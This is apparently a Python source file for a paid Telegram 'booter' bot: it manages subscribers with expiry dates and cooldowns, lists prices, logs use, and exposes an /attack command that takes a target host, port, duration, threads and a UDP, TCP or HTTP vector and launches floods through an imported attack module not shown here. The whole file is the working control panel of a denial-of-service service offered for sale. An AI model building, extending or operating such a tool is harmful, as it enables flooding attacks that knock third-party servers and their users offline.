#!/usr/bin/python3
import datetime
import os
import threading

import telebot

import config
from king import attack, start_attack, VECTORS  # noqa: F401


# ── Mongo bootstrap (with file fallback) ──────────────────────────────────

_mongo_client = None
_mongo_db = None
_users_col = None
_logs_col = None

if config.MONGO_URI:
    try:
        from pymongo import MongoClient
        _mongo_client = MongoClient(config.MONGO_URI, serverSelectionTimeoutMS=5000)
        _mongo_db = _mongo_client[config.MONGO_DB]
        _users_col = _mongo_db[config.MONGO_USERS]
        _logs_col = _mongo_db[config.MONGO_LOGS]
        _mongo_client.server_info()  # ping
        print(f"[mongo] connected to {config.MONGO_DB}")
    except Exception as e:
        print(f"[mongo] unavailable ({e}); falling back to files")
        _mongo_client = None
        _users_col = None
        _logs_col = None


# ── config aliases ────────────────────────────────────────────────────────

bot = telebot.TeleBot(config.BOT_TOKEN)

admin_id = list(config.ADMIN_IDS)
USER_FILE = config.USER_FILE
LOG_FILE = config.LOG_FILE

user_approval_expiry = {}   # user_id -> datetime (mirror of Mongo)
bgmi_cooldown = {}          # user_id -> datetime (in-memory)
COOLDOWN_TIME = config.COOLDOWN_TIME


# ── persistence layer ─────────────────────────────────────────────────────

def _file_read_users():
    try:
        with open(USER_FILE, "r") as f:
            return [ln.strip() for ln in f.read().splitlines() if ln.strip()]
    except FileNotFoundError:
        return []


def _file_write_users(uids):
    with open(USER_FILE, "w") as f:
        for uid in uids:
            f.write(f"{uid}\n")


def load_users():
    """Populate allowed_user_ids + user_approval_expiry from store."""
    global allowed_user_ids
    allowed_user_ids = []
    user_approval_expiry.clear()

    if _users_col is not None:
        for doc in _users_col.find({}):
            uid = str(doc.get("_id"))
            allowed_user_ids.append(uid)
            expiry = doc.get("expiry")
            if expiry:
                user_approval_expiry[uid] = expiry
    else:
        allowed_user_ids = _file_read_users()

    return allowed_user_ids


def persist_add(user_id, expiry):
    if _users_col is not None:
        _users_col.update_one(
            {"_id": str(user_id)},
            {"$set": {"expiry": expiry, "added_at": datetime.datetime.utcnow()}},
            upsert=True,
        )
    else:
        uids = _file_read_users()
        if str(user_id) not in uids:
            uids.append(str(user_id))
            _file_write_users(uids)


def persist_remove(user_id):
    if _users_col is not None:
        _users_col.delete_one({"_id": str(user_id)})
    else:
        uids = [u for u in _file_read_users() if u != str(user_id)]
        _file_write_users(uids)


def persist_clear():
    if _users_col is not None:
        _users_col.delete_many({})
    else:
        _file_write_users([])


def persist_log(user_id, command, target=None, port=None, duration=None, vector=None):
    entry = {
        "user_id": str(user_id),
        "ts": datetime.datetime.utcnow(),
        "command": command,
        "target": target,
        "port": port,
        "duration": duration,
        "vector": vector,
    }
    if _logs_col is not None:
        try:
            _logs_col.insert_one(entry)
        except Exception:
            pass
    # always mirror to file — cheap, greppable
    line = (f"UserID: {user_id} | {entry['ts']} | {command}"
            + (f" | Target: {target}" if target else "")
            + (f" | Port: {port}" if port else "")
            + (f" | Time: {duration}" if duration else "")
            + (f" | Vector: {vector}" if vector else ""))
    try:
        with open(LOG_FILE, "a") as f:
            f.write(line + "\n")
    except OSError:
        pass


allowed_user_ids = load_users()


# ── logging helper (kept for /logs, /mylogs) ─────────────────────────────

def log_command(user_id, target, port, duration):
    try:
        info = bot.get_chat(user_id)
        username = f"@{info.username}" if info.username else f"UserID: {user_id}"
    except Exception:
        username = f"UserID: {user_id}"

    with open(LOG_FILE, "a") as f:
        f.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {duration}\n\n")


# ── approval helpers ──────────────────────────────────────────────────────

def get_remaining_approval_time(user_id):
    expiry = user_approval_expiry.get(user_id)
    if not expiry:
        return "N/A"
    remaining = expiry - datetime.datetime.now()
    if remaining.total_seconds() < 0:
        return "Expired"
    return str(remaining)


def set_approval_expiry_date(user_id, duration, time_unit):
    now = datetime.datetime.now()
    unit = time_unit.lower()
    if unit in ("hour", "hours"):
        expiry = now + datetime.timedelta(hours=duration)
    elif unit in ("day", "days"):
        expiry = now + datetime.timedelta(days=duration)
    elif unit in ("week", "weeks"):
        expiry = now + datetime.timedelta(weeks=duration)
    elif unit in ("month", "months"):
        expiry = now + datetime.timedelta(days=30 * duration)
    else:
        return None
    user_approval_expiry[str(user_id)] = expiry
    persist_add(user_id, expiry)
    return expiry


# ── /add ──────────────────────────────────────────────────────────────────

@bot.message_handler(commands=["add"])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Not authorized.")
        return

    parts = message.text.split()
    if len(parts) <= 2:
        bot.reply_to(message, "Usage: /add <user_id> <duration>  (e.g. 1hour, 2days, 3weeks, 4months)")
        return

    user_to_add, duration_str = parts[1], parts[2]

    try:
        duration = int(duration_str[:-4])
        if duration <= 0:
            raise ValueError
        time_unit = duration_str[-4:].lower()
        if time_unit not in ("hour", "hours", "day", "days",
                             "week", "weeks", "month", "months"):
            raise ValueError
    except ValueError:
        bot.reply_to(message, "Invalid duration. Use e.g. 1hour, 2days, 3weeks, 4months.")
        return

    if user_to_add in allowed_user_ids:
        bot.reply_to(message, "User already exists.")
        return

    allowed_user_ids.append(user_to_add)
    expiry = set_approval_expiry_date(user_to_add, duration, time_unit)

    if expiry:
        bot.reply_to(
            message,
            f"User {user_to_add} added for {duration} {time_unit}. "
            f"Expires {expiry.strftime('%Y-%m-%d %H:%M:%S')}.",
        )
    else:
        bot.reply_to(message, "Failed to set expiry.")


# ── /remove ───────────────────────────────────────────────────────────────

@bot.message_handler(commands=["remove"])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Not authorized.")
        return

    parts = message.text.split()
    if len(parts) <= 1:
        bot.reply_to(message, "Usage: /remove <user_id>")
        return

    user_to_remove = parts[1]
    if user_to_remove not in allowed_user_ids:
        bot.reply_to(message, f"User {user_to_remove} not found.")
        return

    allowed_user_ids.remove(user_to_remove)
    user_approval_expiry.pop(user_to_remove, None)
    bgmi_cooldown.pop(user_to_remove, None)
    persist_remove(user_to_remove)
    bot.reply_to(message, f"User {user_to_remove} removed.")


# ── /myinfo ───────────────────────────────────────────────────────────────

@bot.message_handler(commands=["myinfo"])
def get_user_info(message):
    user_id = str(message.chat.id)
    try:
        info = bot.get_chat(user_id)
        username = info.username or "N/A"
    except Exception:
        username = "N/A"

    role = "Admin" if user_id in admin_id else "User"
    remaining = get_remaining_approval_time(user_id)
    expiry = user_approval_expiry.get(user_id, "Not Approved")

    text = (
        f"👤 Your Info:\n\n"
        f"🆔 User ID: <code>{user_id}</code>\n"
        f"📝 Username: {username}\n"
        f"🔖 Role: {role}\n"
        f"📅 Approval Expiry: {expiry}\n"
        f"⏳ Remaining: {remaining}"
    )
    bot.reply_to(message, text, parse_mode="HTML")


# ── /clearlogs ────────────────────────────────────────────────────────────

@bot.message_handler(commands=["clearlogs"])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Not authorized.")
        return

    if _logs_col is not None:
        _logs_col.delete_many({})

    try:
        with open(LOG_FILE, "r+") as f:
            f.seek(0)
            f.truncate(0)
    except FileNotFoundError:
        pass

    bot.reply_to(message, "Logs cleared.")


# ── /clearusers ───────────────────────────────────────────────────────────

@bot.message_handler(commands=["clearusers"])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Not authorized.")
        return

    allowed_user_ids.clear()
    user_approval_expiry.clear()
    bgmi_cooldown.clear()
    persist_clear()
    bot.reply_to(message, "Users cleared.")


# ── /allusers ─────────────────────────────────────────────────────────────

@bot.message_handler(commands=["allusers"])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Not authorized.")
        return

    if not allowed_user_ids:
        bot.reply_to(message, "No users.")
        return

    lines = ["Authorized Users:"]
    for uid in allowed_user_ids:
        try:
            info = bot.get_chat(int(uid))
            lines.append(f"- @{info.username} (ID: {uid})")
        except Exception:
            lines.append(f"- User ID: {uid}")
    bot.reply_to(message, "\n".join(lines))


# ── /logs ─────────────────────────────────────────────────────────────────

@bot.message_handler(commands=["logs"])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Not authorized.")
        return

    if not os.path.exists(LOG_FILE) or os.path.getsize(LOG_FILE) == 0:
        bot.reply_to(message, "No data found.")
        return

    with open(LOG_FILE, "rb") as f:
        bot.send_document(message.chat.id, f)


# ── /mylogs ───────────────────────────────────────────────────────────────

@bot.message_handler(commands=["mylogs"])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        bot.reply_to(message, "Not authorized.")
        return

    try:
        with open(LOG_FILE, "r") as f:
            lines = [ln for ln in f.readlines() if f"UserID: {user_id}" in ln]
    except FileNotFoundError:
        bot.reply_to(message, "No logs.")
        return

    if not lines:
        bot.reply_to(message, "No command logs found.")
        return

    bot.reply_to(message, "Your Command Logs:\n" + "".join(lines[-30:]))


# ── /attack parser ────────────────────────────────────────────────────────

def _parse_attack(text):
    """
    Accept:
        /attack <host> <port> <time> [threads] [vector]
        /attack <host>:<port> <time> [threads] [vector]
        /attack <host>:<port>                      (time=60, defaults)

    vector ∈ {"udp","tcp","http"}. Unknown trailing word = vector parse error.
    Returns (target, port, duration, threads, vector).
    """
    parts = text.split()
    threads = config.DEFAULT_THREADS
    vector = config.DEFAULT_VECTOR
    duration_default = config.DEFAULT_DURATION

    # detect trailing vector
    if len(parts) >= 2 and parts[-1].lower() in VECTORS:
        vector = parts[-1].lower()
        parts = parts[:-1]

    # detect trailing threads (numeric and not the port slot)
    if len(parts) >= 2 and parts[-1].isdigit():
        candidate = int(parts[-1])
        # threads sits after duration; only treat as threads if we already
        # have at least 3 tokens (cmd target duration ...)
        if len(parts) >= 4:
            threads = candidate
            parts = parts[:-1]

    if len(parts) == 4:
        # cmd target port duration
        target = parts[1]
        try:
            port = int(parts[2])
            duration = int(parts[3])
        except ValueError:
            raise ValueError("port and time must be integers")

    elif len(parts) in (2, 3):
        head = parts[1]
        if ":" not in head:
            raise ValueError("missing port — use host:port or split form")
        host, _, port_str = head.rpartition(":")
        if not host or not port_str.isdigit():
            raise ValueError("malformed host:port")
        target = host
        port = int(port_str)
        if len(parts) == 3:
            try:
                duration = int(parts[2])
            except ValueError:
                raise ValueError("time must be an integer")
        else:
            duration = duration_default

    else:
        raise ValueError(
            "usage: /attack <host> <port> <time> [threads] [udp|tcp|http]\n"
            "       /attack <host>:<port> <time> [threads] [vector]\n"
            "       /attack <host>:<port> [vector]"
        )

    if not target:
        raise ValueError("empty target")
    if not (0 < port < 65536):
        raise ValueError(f"port out of range: {port}")
    if not (0 < duration <= config.MAX_DURATION):
        raise ValueError(f"time must be 1-{config.MAX_DURATION}s")
    if not (0 < threads <= config.MAX_THREADS):
        raise ValueError(f"threads must be 1-{config.MAX_THREADS}")

    return target, port, duration, threads, vector


# ── /attack ───────────────────────────────────────────────────────────────

def start_attack_reply(message, target, port, duration, threads, vector):
    user_info = message.from_user
    username = user_info.username or user_info.first_name
    text = (
        f"{username}, ATTACK STARTED.\n\n"
        f"Target:  {target}\n"
        f"Port:    {port}\n"
        f"Time:    {duration}s\n"
        f"Threads: {threads}\n"
        f"Vector:  {vector.upper()}"
    )
    bot.reply_to(message, text)


@bot.message_handler(commands=["attack"])
def handle_attack(message):
    user_id = str(message.chat.id)

    if user_id not in allowed_user_ids:
        bot.reply_to(message, "Unauthorized.")
        return

    if user_id not in admin_id and COOLDOWN_TIME > 0:
        last = bgmi_cooldown.get(user_id)
        if last and (datetime.datetime.now() - last).total_seconds() < COOLDOWN_TIME:
            remaining = COOLDOWN_TIME - int((datetime.datetime.now() - last).total_seconds())
            bot.reply_to(message, f"Cooldown. Wait {remaining}s.")
            return

    try:
        target, port, duration, threads, vector = _parse_attack(message.text)
    except ValueError as e:
        bot.reply_to(message, f"Parse error: {e}")
        return

    if user_id not in admin_id:
        bgmi_cooldown[user_id] = datetime.datetime.now()

    persist_log(user_id, "/attack", target, port, duration, vector)
    log_command(user_id, target, port, duration)
    start_attack_reply(message, target, port, duration, threads, vector)

    def _run():
        t0 = datetime.datetime.now()
        try:
            r = attack(
                target,
                port,
                duration,
                threads=threads,
                payload_size=config.PAYLOAD_SIZE,
                vector=vector,
            )
            elapsed = (datetime.datetime.now() - t0).total_seconds()

            lines = [
                "✅ Attack complete",
                f"Target:   {target}:{port}",
                f"Vector:   {vector.upper()}",
                f"Workers:  {r['workers']}/{threads}",
                f"Sent:     {r['sent']}",
                f"Errors:   {r['errors']}",
                f"Duration: {elapsed:.1f}s",
            ]
            if r.get("last_error"):
                lines.append(f"Last err: {r['last_error']}")

            bot.send_message(message.chat.id, "\n".join(lines))

        except (ValueError, RuntimeError, OSError) as e:
            try:
                bot.send_message(message.chat.id, f"❌ Attack error: {e}")
            except Exception:
                pass

    threading.Thread(target=_run, daemon=True).start()

# ── /help ─────────────────────────────────────────────────────────────────

@bot.message_handler(commands=["help"])
def show_help(message):
    text = (
        "Available commands:\n"
        "/attack    — start an attack\n"
        "             /attack <host> <port> <time> [threads] [udp|tcp|http]\n"
        "             /attack <host>:<port> <time> [threads] [vector]\n"
        "             /attack <host>:<port> [vector]\n"
        "/rules     — read rules\n"
        "/mylogs    — your recent attacks\n"
        "/plan      — pricing\n"
        "/myinfo    — your account info\n"
        "/admincmd  — admin commands"
    )
    bot.reply_to(message, text)


# ── /start, /rules, /plan ─────────────────────────────────────────────────

@bot.message_handler(commands=["start"])
def welcome_start(message):
    name = message.from_user.first_name
    bot.reply_to(message, f"Welcome, {name}. Run /help for commands.")


@bot.message_handler(commands=["rules"])
def welcome_rules(message):
    name = message.from_user.first_name
    bot.reply_to(
        message,
        f"{name}, rules:\n"
        "1. Don't spam attacks.\n"
        "2. One attack at a time.\n"
        "3. Follow the channel.\n"
        "4. Logs are checked daily.",
    )


@bot.message_handler(commands=["plan"])
def welcome_plan(message):
    name = message.from_user.first_name
    bot.reply_to(
        message,
        f"{name}, plans:\n\n"
        "VIP:\n"
        "  Attack time:  300s\n"
        "  Cooldown:     10s\n"
        "  Concurrents:  5\n\n"
        "Prices:\n"
        "  3 days — 200\n"
        "  Week   — 300\n"
        "  Month  — 500",
    )


# ── /admincmd ─────────────────────────────────────────────────────────────

@bot.message_handler(commands=["admincmd"])
def show_admin_commands(message):
    name = message.from_user.first_name
    bot.reply_to(
        message,
        f"{name}, admin commands:\n"
        "/add <user_id> <duration>\n"
        "/remove <user_id>\n"
        "/allusers\n"
        "/logs\n"
        "/broadcast <msg>\n"
        "/clearlogs\n"
        "/clearusers",
    )


# ── /broadcast ────────────────────────────────────────────────────────────

@bot.message_handler(commands=["broadcast"])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Not authorized.")
        return

    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /broadcast <message>")
        return

    text = "Message from admin:\n\n" + parts[1]
    sent = 0
    failed = 0
    for uid in list(allowed_user_ids):
        try:
            bot.send_message(uid, text)
            sent += 1
        except Exception:
            failed += 1

    bot.reply_to(message, f"Broadcast sent: {sent}, failed: {failed}.")


# ── boot ──────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    storage = "mongo" if _users_col is not None else "files"
    print(f"[boot] storage={storage}  users={len(allowed_user_ids)}  vectors={VECTORS}")
    bot.infinity_polling(skip_pending=True, timeout=30)
